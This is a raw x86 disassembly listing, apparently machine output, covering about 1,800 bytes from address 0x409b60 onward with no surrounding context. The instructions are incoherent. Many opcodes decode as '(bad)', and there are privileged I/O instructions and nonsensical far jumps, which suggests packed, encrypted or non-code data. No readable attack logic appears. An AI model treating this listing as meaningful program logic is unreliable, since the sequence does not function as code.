  409b60:	pop    esp
  409b61:	push   ss
  409b62:	and    eax,0xbae13b3a
  409b67:	push   edi
  409b68:	cmp    al,0xf0
  409b6a:	inc    esp
  409b6b:	sub    esi,edi
  409b6d:	ds cmp eax,0x5ad88e73
  409b73:	push   eax
  409b74:	pop    ecx
  409b75:	ret    0xa90f
  409b78:	fstp   TBYTE PTR [ebx]
  409b7a:	shl    BYTE PTR [edx-0x28],0x1e
  409b7e:	inc    ecx
  409b7f:	pushf  
  409b80:	or     ch,BYTE PTR [edx]
  409b82:	pop    esi
  409b83:	and    eax,0x355153d6
  409b88:	push   esi
  409b89:	fidivr WORD PTR [edi-0x210304c9]
  409b8f:	mov    WORD PTR [eax+0x2],?
  409b92:	xchg   bl,dl
  409b94:	fcom   DWORD PTR [edx]
  409b96:	out    dx,eax
  409b97:	cli    
  409b98:	pop    eax
  409b99:	jo     0x409bd3
  409b9b:	sub    al,BYTE PTR [ecx-0x80]
  409b9e:	mov    bl,0x61
  409ba0:	in     eax,dx
  409ba1:	inc    ecx
  409ba2:	mov    bh,0xb1
  409ba4:	ins    DWORD PTR es:[edi],dx
  409ba5:	mov    ds:0x7aa16dc3,eax
  409baa:	dec    esi
  409bab:	xchg   BYTE PTR [eax+0x3],cl
  409bae:	jmp    FWORD PTR [esi+0x3c]
  409bb1:	xchg   ebx,eax
  409bb2:	pop    ebx
  409bb3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bb4:	inc    ebp
  409bb5:	xor    eax,0x58670472
  409bba:	and    esp,eax
  409bbc:	pop    edi
  409bbd:	scas   eax,DWORD PTR es:[edi]
  409bbe:	mov    dl,0x3
  409bc0:	shl    DWORD PTR [eax-0x62],cl
  409bc3:	add    al,0x26
  409bc5:	mov    esp,0xf57d2b54
  409bca:	call   0xc01d7559
  409bcf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bd0:	iret   
  409bd1:	sbb    eax,DWORD PTR [ebx+0x46f47160]
  409bd7:	es popf 
  409bd9:	add    BYTE PTR [edi+0x16],dl
  409bdc:	fcom   QWORD PTR [ecx-0x61]
  409bdf:	xchg   edx,eax
  409be0:	mov    al,ds:0x4e3a2ec5
  409be5:	push   0xffffffa8
  409be7:	test   BYTE PTR [ebx-0x4d],cl
  409bea:	xchg   edi,eax
  409beb:	imul   ecx,DWORD PTR [esi],0x82d8d2a1
  409bf1:	lock jmp 0x409c08
  409bf4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409bf5:	and    eax,0x667a9f77
  409bfa:	jbe    0x409c39
  409bfc:	push   esi
  409bfd:	mov    esi,0x33172d16
  409c02:	xor    ecx,edx
  409c04:	jp     0x409c29
  409c06:	mov    al,ds:0x519f8259
  409c0b:	leave  
  409c0c:	dec    edx
  409c0d:	pop    DWORD PTR [eax+esi*1+0x6c348f59]
  409c14:	push   ecx
  409c15:	fadd   QWORD PTR [edx+ecx*1-0x6e]
  409c19:	lea    edi,[edx]
  409c1b:	adc    BYTE PTR [ecx+0x568b43c6],bh
  409c21:	cmc    
  409c22:	in     al,dx
  409c23:	fdiv   QWORD PTR [eax-0x2c759893]
  409c29:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c2a:	mov    edx,0xfd4da249
  409c2f:	mov    edx,0x778ce5b2
  409c34:	xor    eax,0x6e5e2c59
  409c39:	pop    esp
  409c3a:	cmp    al,0x66
  409c3c:	sbb    al,BYTE PTR [ebx+edi*1+0x51]
  409c40:	(bad)  
  409c41:	cli    
  409c42:	or     al,0x31
  409c44:	repnz sbb BYTE PTR [eax+0x66647b02],dl
  409c4b:	adc    ah,BYTE PTR [esi-0x13]
  409c4e:	lods   eax,DWORD PTR ds:[esi]
  409c4f:	xchg   ebp,eax
  409c50:	out    0x80,eax
  409c52:	xchg   ecx,eax
  409c53:	and    ebp,esi
  409c55:	mov    eax,cs
  409c57:	fyl2xp1 
  409c59:	sub    al,0xa0
  409c5b:	push   esp
  409c5c:	jae    0x409cc4
  409c5e:	leave  
  409c5f:	mov    ah,0xf3
  409c61:	cmp    dl,ch
  409c63:	in     eax,dx
  409c64:	stos   DWORD PTR es:[edi],eax
  409c65:	cmp    ch,BYTE PTR cs:[edi+0x64]
  409c69:	scas   eax,DWORD PTR es:[edi]
  409c6a:	or     ebx,ebx
  409c6c:	mov    es,WORD PTR [ecx-0x5c3847a8]
  409c72:	rcl    esp,1
  409c74:	aas    
  409c75:	pop    ecx
  409c76:	fidivr WORD PTR [edi]
  409c78:	mov    esi,0xeab4925d
  409c7d:	stc    
  409c7e:	sbb    eax,0xd9fff974
  409c83:	test   BYTE PTR [esi],bl
  409c85:	sti    
  409c86:	idiv   DWORD PTR [edi]
  409c88:	aam    0x1
  409c8a:	dec    esi
  409c8b:	outs   dx,DWORD PTR ds:[esi]
  409c8c:	xchg   edi,eax
  409c8d:	sub    al,0x4e
  409c8f:	sbb    esp,DWORD PTR [ebp+0x9]
  409c92:	sbb    bh,BYTE PTR [edi-0x8]
  409c95:	sub    DWORD PTR [edx+0x50],edi
  409c98:	in     al,0x50
  409c9a:	and    al,0x41
  409c9c:	adc    cl,BYTE PTR [ebp+edx*8+0x767996f1]
  409ca3:	dec    edi
  409ca4:	dec    ebx
  409ca5:	xchg   ebp,eax
  409ca6:	lahf   
  409ca7:	fiadd  DWORD PTR [edx+ebp*4-0x1a]
  409cab:	pushf  
  409cac:	push   edi
  409cad:	mov    BYTE PTR [ebp-0x32357975],dl
  409cb3:	call   FWORD PTR [eax]
  409cb5:	or     esi,ebx
  409cb7:	stos   BYTE PTR es:[edi],al
  409cb8:	mov    dh,0x4b
  409cba:	jns    0x409c75
  409cbc:	inc    edx
  409cbd:	and    al,0x82
  409cbf:	out    dx,al
  409cc0:	jo     0x409d2e
  409cc2:	dec    esi
  409cc3:	jae    0x409c5f
  409cc5:	mov    al,0x86
  409cc7:	sbb    eax,0x7ed3523a
  409ccc:	pop    ss
  409ccd:	mov    eax,ds:0xf7080a5f
  409cd2:	lea    esp,[edx-0x27]
  409cd5:	out    dx,al
  409cd6:	repnz (bad) [ebx+0x1a]
  409cda:	cdq    
  409cdb:	add    dl,BYTE PTR [edi-0x19088bca]
  409ce1:	(bad)
  409ce4:	enter  0x54a6,0x4b
  409ce8:	dec    ebx
  409ce9:	jmp    0xc0f86f98
  409cee:	inc    ecx
  409cef:	or     BYTE PTR [edi-0x4cd732ae],dh
  409cf5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409cf6:	mov    ecx,0xa3479e9a
  409cfb:	ret    
  409cfc:	icebp  
  409cfd:	or     BYTE PTR [esi+eiz*8+0x7d],dl
  409d01:	(bad)  
  409d02:	fmulp  st(2),st
  409d04:	sub    eax,0xb013048c
  409d09:	test   eax,0x36bbf4d8
  409d0e:	je     0x409ca7
  409d10:	sbb    DWORD PTR ds:[ebp-0x63],esi
  409d14:	ss call 0xd6e9:0xd329a99a
  409d1c:	call   FWORD PTR [ebp-0x3f]
  409d1f:	cmp    DWORD PTR gs:[eax],esi
  409d22:	call   0x832424f1
  409d27:	repnz nop
  409d29:	sbb    al,0x79
  409d2b:	jns    0x409d4a
  409d2d:	outs   dx,BYTE PTR ds:[esi]
  409d2e:	ficom  DWORD PTR [edx]
  409d30:	pop    eax
  409d31:	or     eax,0x7659c36f
  409d36:	imul   edi,ebx,0x4fdab133
  409d3c:	popa   
  409d3d:	pop    ss
  409d3e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409d3f:	stc    
  409d40:	test   BYTE PTR ds:0x2d4695bf,0xfb
  409d47:	(bad)  
  409d48:	sbb    DWORD PTR [ebx+ecx*2+0x60],edi
  409d4c:	fs inc ebx
  409d4e:	outs   dx,DWORD PTR ds:[esi]
  409d4f:	pop    edi
  409d50:	push   esi
  409d51:	sub    eax,0x82cf2ba1
  409d56:	imul   ebp,edi,0x56
  409d59:	rcr    DWORD PTR [ebp-0x6a],1
  409d5c:	add    dl,BYTE PTR [edi-0x61]
  409d5f:	es adc al,0x70
  409d62:	dec    esi
  409d63:	in     al,dx
  409d64:	inc    ecx
  409d65:	xor    ch,BYTE PTR cs:[eax]
  409d68:	aas    
  409d69:	out    0xac,eax
  409d6b:	xor    DWORD PTR [ebx],edx
  409d6d:	mov    ch,0xd7
  409d6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409d70:	jle    0x409dc8
  409d72:	cmp    DWORD PTR [edx*8-0x69ff6404],esp
  409d79:	jecxz  0x409d44
  409d7b:	cli    
  409d7c:	mov    fs,WORD PTR [ecx+edi*1-0x4dbf5074]
  409d83:	das    
  409d84:	stos   DWORD PTR es:[edi],eax
  409d85:	inc    ebp
  409d86:	scas   eax,DWORD PTR es:[edi]
  409d87:	in     al,0x99
  409d89:	je     0x409d3d
  409d8b:	retf   0x97f4
  409d8e:	cld    
  409d8f:	cmp    cl,bh
  409d91:	push   ds
  409d92:	in     eax,0x40
  409d94:	icebp  
  409d95:	stos   DWORD PTR es:[edi],eax
  409d96:	std    
  409d97:	sub    eax,DWORD PTR [edi]
  409d99:	inc    ecx
  409d9a:	xchg   BYTE PTR [eax],ah
  409d9c:	lods   eax,DWORD PTR ds:[esi]
  409d9d:	sub    DWORD PTR [ecx+0x2cd6bd4],ecx
  409da3:	mov    eax,0x3aee4e86
  409da8:	(bad)  
  409da9:	out    dx,eax
  409daa:	jmp    0x409e17
  409dac:	clc    
  409dad:	or     BYTE PTR [eax],dh
  409daf:	push   edi
  409db0:	xchg   ebp,eax
  409db1:	xor    BYTE PTR [ecx],0xb7
  409db4:	loopne 0x409d83
  409db6:	icebp  
  409db7:	test   BYTE PTR [ebp*8+0x7a7b4db5],dh
  409dbe:	pop    ecx
  409dbf:	ins    DWORD PTR es:[edi],dx
  409dc0:	jo     0x409d7b
  409dc2:	in     eax,dx
  409dc3:	fsub   DWORD PTR [edi-0x68a001cc]
  409dc9:	loop   0x409d64
  409dcb:	xchg   DWORD PTR [ebx+edx*4],esi
  409dce:	pop    edi
  409dcf:	xchg   DWORD PTR [edi+0x7d],eax
  409dd2:	pop    eax
  409dd3:	cmc    
  409dd4:	xchg   ecx,eax
  409dd5:	je     0x409d7c
  409dd7:	sti    
  409dd8:	mov    eax,DWORD PTR [ebp+0x4e]
  409ddb:	aad    0x31
  409ddd:	shl    BYTE PTR [ebp-0x35],1
  409de0:	pushf  
  409de1:	bound  eax,QWORD PTR ds:0x32d2ef3f
  409de7:	aaa    
  409de8:	dec    ebx
  409de9:	mov    ?,ebp
  409deb:	lods   eax,DWORD PTR ds:[esi]
  409dec:	(bad)  
  409ded:	repz xlat BYTE PTR ds:[ebx]
  409def:	ja     0x409dc4
  409df1:	jmp    0xd6959e6e
  409df6:	(bad)  
  409df7:	dec    edx
  409df8:	lahf   
  409df9:	icebp  
  409dfa:	jmp    FWORD PTR [esi]
  409dfc:	mov    cl,0xf6
  409dfe:	mov    dl,0xc3
  409e00:	retf   
  409e01:	jb     0x409e31
  409e03:	xchg   esp,eax
  409e04:	stos   DWORD PTR es:[edi],eax
  409e05:	aam    0x5
  409e07:	retf   0x622f
  409e0a:	or     BYTE PTR [ebx+ebp*8],ch
  409e0d:	dec    ecx
  409e0e:	pop    esp
  409e0f:	sub    al,0x18
  409e11:	mov    edx,0xdd13f256
  409e16:	add    BYTE PTR ds:0x4274af32,ah
  409e1c:	aaa    
  409e1d:	arpl   WORD PTR [ebx-0x6d5a5ed4],si
  409e23:	scas   al,BYTE PTR es:[edi]
  409e24:	mov    DWORD PTR [ebx+0x25],edi
  409e27:	cld    
  409e28:	jno    0x409dcf
  409e2a:	dec    ebx
  409e2b:	sub    eax,0xe00589f2
  409e30:	sub    BYTE PTR [ebx-0x45d9c8e7],0x4
  409e37:	inc    ecx
  409e38:	mov    ecx,0x22ea84e6
  409e3d:	mov    ds:0xefe344f5,eax
  409e42:	sbb    ebp,ebp
  409e44:	or     al,cl
  409e46:	shl    DWORD PTR [eax+0x52],0x5
  409e4a:	fadd   st,st(1)
  409e4c:	adc    BYTE PTR [esi+eax*4],dh
  409e4f:	sar    edi,1
  409e51:	test   DWORD PTR [eax-0x30],0x343d884f
  409e58:	(bad)  
  409e59:	jl     0x409dff
  409e5b:	mov    bh,0x6a
  409e5d:	gs mov edi,0xee43cdd4
  409e63:	xchg   ecx,eax
  409e64:	mov    eax,ds:0x598d9ed6
  409e69:	jmp    0x5847b86b
  409e6e:	es xchg edx,eax
  409e70:	das    
  409e71:	xor    cl,BYTE PTR [edi]
  409e73:	pop    ebp
  409e74:	add    eax,0xb8d5893a
  409e79:	mov    esi,0x7741cd
  409e7e:	aam    0x7d
  409e80:	or     ecx,eax
  409e82:	adc    edx,DWORD PTR [edi-0x32]
  409e85:	sub    al,0x2
  409e87:	jmp    0x409ef1
  409e89:	push   ds
  409e8a:	adc    ebp,edx
  409e8c:	gs iret 
  409e8e:	inc    esi
  409e8f:	dec    esi
  409e90:	dec    esp
  409e91:	mov    ecx,0x8b8daaa6
  409e96:	sbb    eax,0x6cb7a958
  409e9b:	sbb    BYTE PTR [edx-0x198b736d],ch
  409ea1:	push   ecx
  409ea2:	or     DWORD PTR [ebx],ecx
  409ea4:	lods   eax,DWORD PTR ds:[esi]
  409ea5:	jns    0x409f20
  409ea7:	jne    0x409f06
  409ea9:	or     al,0x2c
  409eab:	ret    0xae4d
  409eae:	xchg   esp,eax
  409eaf:	imul   ebx,DWORD PTR [edx-0x23233bd9],0x2250eff8
  409eb9:	scas   ax,WORD PTR es:[edi]
  409ebb:	pop    ss
  409ebc:	xor    DWORD PTR [edi+0x1c7f3ced],0xcbae1f7e
  409ec6:	popf   
  409ec7:	add    dh,BYTE PTR [eax-0x6d]
  409eca:	pushf  
  409ecb:	mov    BYTE PTR [ecx],dh
  409ecd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409ece:	jmp    0x409f09
  409ed0:	xor    dh,ah
  409ed2:	xchg   edx,eax
  409ed3:	mov    fs,ecx
  409ed5:	int    0x82
  409ed7:	inc    ebp
  409ed8:	call   0xb771:0x4998aa21
  409edf:	call   0xfbef:0x6352a6b2
  409ee6:	clc    
  409ee7:	push   ss
  409ee8:	out    0x5b,al
  409eea:	dec    esi
  409eeb:	popa   
  409eec:	cwde   
  409eed:	pop    edx
  409eee:	daa    
  409eef:	jne    0x409f12
  409ef1:	jecxz  0x409ebf
  409ef3:	jg     0x409f37
  409ef5:	mov    ebp,0xbefdccad
  409efa:	out    dx,eax
  409efb:	xchg   edi,esp
  409efd:	data16 sbb BYTE PTR [edi],al
  409f00:	xchg   ecx,eax
  409f01:	or     al,0x37
  409f03:	mov    bh,0x94
  409f05:	and    DWORD PTR [ecx],edi
  409f07:	out    dx,eax
  409f08:	pop    edx
  409f09:	mov    ebx,0xab571052
  409f0e:	and    BYTE PTR [ecx+0x5c00162],ah
  409f14:	in     al,0xe
  409f16:	jne    0x409f45
  409f18:	pop    esi
  409f19:	bound  esi,QWORD PTR [ebx-0x1a]
  409f1c:	mov    ds:0x4535741a,eax
  409f21:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f22:	mov    bh,0xe3
  409f24:	stc    
  409f25:	xchg   al,ah
  409f27:	push   ebp
  409f28:	xor    eax,DWORD PTR [edx]
  409f2a:	dec    esp
  409f2b:	and    BYTE PTR [esi+0x520844d8],dl
  409f31:	push   0x74
  409f33:	mov    DWORD PTR [edi+esi*2+0x36d47aff],ebp
  409f3a:	push   cs
  409f3b:	(bad)  
  409f3d:	pop    esi
  409f3e:	xchg   esi,eax
  409f3f:	jnp    0x409f91
  409f41:	sbb    al,0x20
  409f43:	shl    BYTE PTR [ebp+ecx*1-0x61],0x82
  409f48:	mov    ah,0x77
  409f4a:	push   ecx
  409f4b:	fsub   QWORD PTR [ecx+0x5492d15d]
  409f51:	adc    BYTE PTR [esi],0xe
  409f54:	jecxz  0x409f2f
  409f56:	aam    0x13
  409f58:	addr16 in eax,dx
  409f5a:	push   edi
  409f5b:	mov    WORD PTR [ecx],?
  409f5d:	daa    
  409f5e:	cmp    eax,0x6a69139b
  409f63:	jo     0x409f3f
  409f65:	jmp    0x137d:0xcc89d0cc
  409f6c:	aam    0x7
  409f6e:	js     0x409fbc
  409f70:	mov    ?,WORD PTR [edx+0x23]
  409f73:	cli    
  409f74:	add    al,0x4a
  409f76:	jmp    0x409f05
  409f78:	and    BYTE PTR [edx-0x33bc52c3],ch
  409f7e:	pop    ebp
  409f7f:	lods   eax,DWORD PTR ds:[esi]
  409f80:	mov    eax,ds:0xaed19f26
  409f85:	jg     0x409f0a
  409f87:	cdq    
  409f88:	push   ds
  409f89:	dec    eax
  409f8a:	fdiv   QWORD PTR [ebx-0x58]
  409f8d:	cmp    dl,BYTE PTR [eax]
  409f8f:	inc    esi
  409f90:	stos   BYTE PTR es:[edi],al
  409f91:	push   edi
  409f92:	xor    BYTE PTR [ebx-0x39614c2a],ah
  409f98:	and    al,0x1a
  409f9a:	test   al,0x66
  409f9c:	xchg   esp,eax
  409f9d:	ret    0x27e
  409fa0:	jecxz  0x409f5a
  409fa2:	and    al,BYTE PTR [ecx-0x33]
  409fa5:	div    BYTE PTR [ebp+0x3982fe73]
  409fab:	out    dx,al
  409fac:	in     al,dx
  409fad:	and    al,0xa
  409faf:	(bad)
  409fb3:	and    BYTE PTR [edx-0x14f55519],bl
  409fb9:	mov    bl,0x6e
  409fbb:	pop    ebx
  409fbc:	jb     0x40a017
  409fbe:	inc    eax
  409fbf:	mov    esp,0x465da7da
  409fc4:	dec    ebp
  409fc5:	sub    bh,bl
  409fc7:	jecxz  0x409f66
  409fc9:	sub    al,BYTE PTR [eax]
  409fcb:	and    DWORD PTR [eax],esi
  409fcd:	repnz inc ecx
  409fcf:	fs and al,0x70
  409fd2:	and    eax,esp
  409fd4:	mov    eax,0x6e2b8b43
  409fd9:	das    
  409fda:	add    DWORD PTR es:[esi-0x7a78ea18],eax
  409fe1:	sub    bh,BYTE PTR [edi-0x42fe211c]
  409fe7:	mov    dh,BYTE PTR [ecx]
  409fe9:	repz mov ecx,0xc084e0d7
  409fef:	push   ebp
  409ff0:	(bad)  
  409ff1:	je     0x409ffa
  409ff3:	adc    esi,DWORD PTR [eax+0x59]
  409ff6:	jmp    0x6158:0xe7d04d6
  409ffd:	and    edi,eax
  409fff:	xor    dh,BYTE PTR ds:0xbdd34311
  40a005:	xor    al,0x69
  40a007:	setg   BYTE PTR [ebp-0x79746e49]
  40a00e:	push   eax
  40a00f:	xchg   edi,eax
  40a010:	lods   eax,DWORD PTR ds:[esi]
  40a011:	loopne 0x409fb8
  40a013:	xchg   ebx,eax
  40a014:	loopne 0x409fa5
  40a016:	xor    eax,0xccebdc3
  40a01b:	inc    ebx
  40a01c:	jne    0x40a00b
  40a01e:	loop   0x409ff9
  40a020:	fdivr  DWORD PTR [esi-0x93f8174]
  40a026:	sbb    edx,0x89594e4b
  40a02c:	jo     0x40a050
  40a02e:	mov    ebx,0x92a5d8fc
  40a033:	inc    esp
  40a034:	cmp    ebx,ebx
  40a036:	test   DWORD PTR [esi+0x43],ebx
  40a039:	mov    DWORD PTR [eax],edi
  40a03b:	(bad)  
  40a03c:	jle    0x40a095
  40a03e:	jnp    0x40a001
  40a040:	mov    WORD PTR [edi-0x4b],?
  40a043:	jns    0x40a023
  40a045:	add    ah,BYTE PTR [eax-0x6a18f7a9]
  40a04b:	pop    edx
  40a04c:	cld    
  40a04d:	pop    ecx
  40a04e:	int    0xd3
  40a050:	cs mov esi,0xa87fab67
  40a056:	or     al,0x9d
  40a058:	mov    bl,0x5e
  40a05a:	enter  0xe095,0x1d
  40a05e:	xor    ah,BYTE PTR [ebx]
  40a060:	pop    ebp
  40a061:	ins    DWORD PTR es:[edi],dx
  40a062:	adc    al,0x4
  40a064:	(bad)
  40a067:	sbb    DWORD PTR [ebp+ebx*4-0x57778d6c],ebp
  40a06e:	xchg   bh,dh
  40a070:	sbb    bl,BYTE PTR cs:[edi+0x13e17cdd]
  40a077:	out    0xf2,eax
  40a079:	adc    BYTE PTR [edi],ah
  40a07b:	cmc    
  40a07c:	push   ebp
  40a07d:	jp     0x40a0f7
  40a07f:	mov    ds:0x7584d40d,al
  40a084:	scas   eax,DWORD PTR es:[edi]
  40a085:	(bad)  
  40a086:	mov    ebp,0xd2b27504
  40a08b:	fld    TBYTE PTR [ecx+0x7de1b52d]
  40a091:	repz (bad) 
  40a093:	dec    esp
  40a094:	jmp    0x72ef:0x60756676
  40a09b:	inc    ebp
  40a09c:	xor    BYTE PTR [edx],dh
  40a09e:	retf   0x4839
  40a0a1:	add    eax,0x4bfe6d24
  40a0a6:	shl    DWORD PTR [eax+0x4e],0xbb
  40a0aa:	sub    eax,0xad213902
  40a0af:	jbe    0x40a0a6
  40a0b1:	scas   eax,DWORD PTR es:[edi]
  40a0b2:	dec    ebp
  40a0b3:	cmp    al,0xce
  40a0b5:	jmp    0x9b0e:0xab49fa30
  40a0bc:	test   eax,0x2f5b7955
  40a0c1:	jmp    0x40a102
  40a0c3:	repnz out dx,al
  40a0c5:	inc    esi
  40a0c6:	or     edx,eax
  40a0c8:	cld    
  40a0c9:	sub    BYTE PTR ds:[esi+edx*8],dl
  40a0cd:	cmp    al,0x6c
  40a0cf:	enter  0xbb4c,0x9a
  40a0d3:	(bad)  
  40a0d4:	iret   
  40a0d5:	dec    ebx
  40a0d6:	test   BYTE PTR [ecx+eax*8],0x54
  40a0da:	(bad)  
  40a0db:	sub    al,0x9
  40a0dd:	push   ss
  40a0de:	pop    es
  40a0df:	jbe    0x40a0cf
  40a0e1:	pop    eax
  40a0e2:	stc    
  40a0e3:	sbb    DWORD PTR [edx-0x31],eax
  40a0e6:	scas   eax,DWORD PTR es:[edi]
  40a0e7:	pop    edx
  40a0e8:	into   
  40a0e9:	inc    edx
  40a0ea:	lods   al,BYTE PTR ds:[esi]
  40a0eb:	mov    ebx,DWORD PTR [ecx+edx*1-0x63]
  40a0ef:	pop    edi
  40a0f0:	jmp    0x7797:0x5de60601
  40a0f7:	jle    0x40a158
  40a0f9:	dec    edx
  40a0fa:	jmp    0x1f4d:0x95d23c96
  40a101:	les    ebx,FWORD PTR [edx]
  40a103:	pop    edx
  40a104:	std    
  40a105:	xchg   DWORD PTR [edi-0x1],edi
  40a108:	push   eax
  40a109:	in     al,0x39
  40a10b:	inc    ebp
  40a10c:	xchg   edi,eax
  40a10d:	or     al,0x93
  40a10f:	or     DWORD PTR [eax+edx*4],ecx
  40a112:	mov    edx,0x4ce9c875
  40a117:	outs   dx,DWORD PTR ds:[esi]
  40a118:	xchg   edi,eax
  40a119:	sub    DWORD PTR [ebp+eiz*8-0x17],edi
  40a11d:	dec    eax
  40a11e:	(bad)  
  40a11f:	adc    bh,ah
  40a121:	leave  
  40a122:	call   0x8b7f:0x260bb98c
  40a129:	sar    al,0xf2
  40a12c:	hlt    
  40a12d:	test   DWORD PTR [ebp-0x5b],esp
  40a130:	cmc    
  40a131:	sub    esi,DWORD PTR [edi+0x34]
  40a134:	rcl    ch,1
  40a136:	repnz push esi
  40a138:	imul   ebp,DWORD PTR [ecx+0x738faedb],0xb55f8bcb
  40a142:	pop    ecx
  40a143:	in     al,0xbc
  40a145:	bound  esi,QWORD PTR [edx+0x63]
  40a148:	xchg   BYTE PTR [ecx-0x25821bad],cl
  40a14e:	shr    BYTE PTR [esi],0x33
  40a151:	test   eax,0xf94ca71a
  40a156:	pop    ds
  40a157:	xor    al,BYTE PTR ds:0x1555a169
  40a15d:	push   esi
  40a15e:	and    esp,DWORD PTR [ecx+0x5d]
  40a161:	aas    
  40a162:	stos   BYTE PTR es:[edi],al
  40a163:	jmp    0x48c8:0xcddcff34
  40a16a:	int3   
  40a16b:	es ins DWORD PTR es:[edi],dx
  40a16d:	ins    BYTE PTR es:[edi],dx
  40a16e:	pop    edi
  40a16f:	shr    bl,0x92
  40a172:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a173:	cmp    eax,0x82c6c1f9
  40a178:	loope  0x40a15b
  40a17a:	inc    esp
  40a17b:	fisubr DWORD PTR [ebx-0x9]
  40a17e:	cmc    
  40a17f:	dec    edi
  40a180:	ret    
  40a181:	cmp    DWORD PTR [esi],eax
  40a183:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a184:	into   
  40a185:	call   0xb8eb:0x973f3708
  40a18c:	test   eax,0x91192ce9
  40a191:	test   al,0x3e
  40a193:	fnstcw WORD PTR [edi]
  40a195:	add    eax,0x72d1429
  40a19a:	js     0x40a197
  40a19c:	xchg   esi,eax
  40a19d:	jg     0x40a1e1
  40a19f:	cmp    eax,0xe97b4335
  40a1a4:	ss inc edx
  40a1a6:	xor    eax,0xac5269b9
  40a1ab:	cmp    DWORD PTR [ebx+0x14c05c1d],ecx
  40a1b1:	ficom  DWORD PTR [edx]
  40a1b3:	xor    ah,BYTE PTR [ebp-0x5b]
  40a1b6:	adc    al,0x32
  40a1b8:	pusha  
  40a1b9:	adc    ecx,0xce3f137
  40a1bf:	push   edx
  40a1c1:	iret   
  40a1c2:	inc    esp
  40a1c3:	in     al,0xdf
  40a1c5:	idiv   DWORD PTR [eax+0x69d2647b]
  40a1cb:	inc    ebx
  40a1cc:	mov    DWORD PTR [ebp-0x3f],esi
  40a1cf:	and    esp,ebx
  40a1d1:	mov    bh,0x9
  40a1d3:	mov    ebp,0x748d8fc9
  40a1d8:	icebp  
  40a1d9:	xor    BYTE PTR [ecx],bl
  40a1db:	or     BYTE PTR [ecx-0x7d],dh
  40a1de:	clc    
  40a1df:	(bad)  
  40a1e0:	push   edx
  40a1e1:	push   cs
  40a1e2:	jg     0x40a22b
  40a1e4:	push   esp
  40a1e5:	adc    edi,edi
  40a1e7:	or     al,0x7
  40a1e9:	std    
  40a1ea:	xchg   bx,ax
  40a1ec:	mov    ch,0xa2
  40a1ee:	fsub   st,st(3)
  40a1f0:	pop    eax
  40a1f1:	mov    dh,0xc
  40a1f3:	adc    bh,BYTE PTR [esi-0x37]
  40a1f6:	mov    edi,0x73336dac
  40a1fb:	mov    bl,0x22
  40a1fd:	dec    edi
  40a1fe:	ret    
  40a1ff:	jo     0x40a1a5
  40a201:	jge    0x40a1d3
  40a203:	ds adc eax,0x20d40425
  40a209:	push   0x75
  40a20b:	sub    eax,0x9555f5b6
  40a210:	sbb    edx,DWORD PTR [edx+0x14]
  40a213:	ret    
  40a214:	or     bh,BYTE PTR [esi]
  40a216:	and    esi,DWORD PTR [edi+0xf86977c]
  40a21c:	mov    ah,0x5e
  40a21e:	int    0x36
  40a220:	in     eax,dx
  40a221:	and    BYTE PTR [ebx+0x42a6d3e5],cl
  40a227:	xchg   ebx,eax
  40a228:	push   ebp
  40a229:	inc    edx
  40a22a:	sub    al,0x3f
  40a22c:	pushf  
  40a22d:	jbe    0x40a248
  40a22f:	adc    cl,BYTE PTR [ebx+0x68dbf005]
  40a235:	fldlg2 
  40a237:	inc    ebp
  40a238:	and    eax,0x9f9f62c9
  40a23d:	fidiv  WORD PTR [ebp-0x1e515eed]
  40a243:	mov    bl,0x43
  40a245:	add    DWORD PTR [edx],edi
  40a247:	xchg   BYTE PTR [esi+0x6f],bh
  40a24a:	das    
  40a24b:	dec    edx
  40a24c:	mov    dh,0xfb
  40a24e:	aaa    
  40a24f:	mov    esi,0x89485dd4
  40a254:	push   0x5107fd30
  40a259:	mov    BYTE PTR [ebx+0x2d0efc2f],ch
  40a25f:	sub    eax,0x4b9b48da
  40a264:	repz cdq 
  40a266:	in     eax,0xd
  40a268:	push   ebp
  40a269:	jne    0x40a2e2
  40a26b:	inc    BYTE PTR [ebx]
  40a26d:	data16 jns 0x40a240
  40a270:	xchg   ecx,eax
  40a271:	add    DWORD PTR [edx-0x325957a0],esi
  40a277:	repnz push edx
  40a279:	or     edi,ebp
  40a27b:	outs   dx,BYTE PTR ds:[esi]
  40a27c:	jne    0x40a2b9
  40a27e:	repz mov bl,0x48
  40a281:	xchg   ebx,eax
  40a282:	(bad)  
  40a283:	in     al,0xf3
  40a285:	dec    ecx
  40a286:	mov    BYTE PTR [esi-0x6e487ee3],ah
  40a28c:	mov    WORD PTR [ecx-0x4d90d3bc],ds
  40a292:	jbe    0x40a27a
  40a294:	shr    ch,1
  40a296:	cmp    ch,bl
  40a298:	imul   ebp,DWORD PTR [eax+0x61c004d2],0xffffff8a
  40a29f:	(bad)  
  40a2a1:	into   
  40a2a2:	fsub   QWORD PTR [esi]
  40a2a4:	gs inc eax
  40a2a6:	xor    edx,eax
  40a2a8:	ins    DWORD PTR es:[edi],dx
  40a2a9:	and    BYTE PTR [ecx-0x5cfd98c1],ch
  40a2af:	mov    ecx,0x31ef8f94
  40a2b4:	jge    0x40a2e3
  40a2b6:	cs out dx,al
  40a2b8:	ret    0x8d9c
  40a2bb:	mov    al,ds:0x4c716271
  40a2c0:	inc    ebp
  40a2c1:	enter  0x5492,0xa3
  40a2c5:	aad    0xf5
  40a2c7:	jmp    0x40a264
  40a2c9:	push   eax
  40a2ca:	jp     0x40a318
  40a2cc:	lds    ebp,FWORD PTR ss:[esi+0x20]
  40a2d0:	mov    ch,0x1d
  40a2d2:	jns    0x40a2bc
  40a2d4:	dec    ecx
  40a2d5:	xchg   esp,eax
  40a2d6:	mov    ah,0xfb
  40a2d8:	or     bh,BYTE PTR ds:0x21b0dac9
  40a2de:	pop    esp
  40a2df:	outs   dx,DWORD PTR ds:[esi]
  40a2e0:	mov    esp,0xdccded86
  40a2e5:	(bad)  
  40a2e6:	sti    
  40a2e7:	nop
  40a2e8:	sti    
  40a2e9:	fld    st(1)
  40a2eb:	sub    ah,BYTE PTR [esi]
  40a2ed:	test   ecx,eax
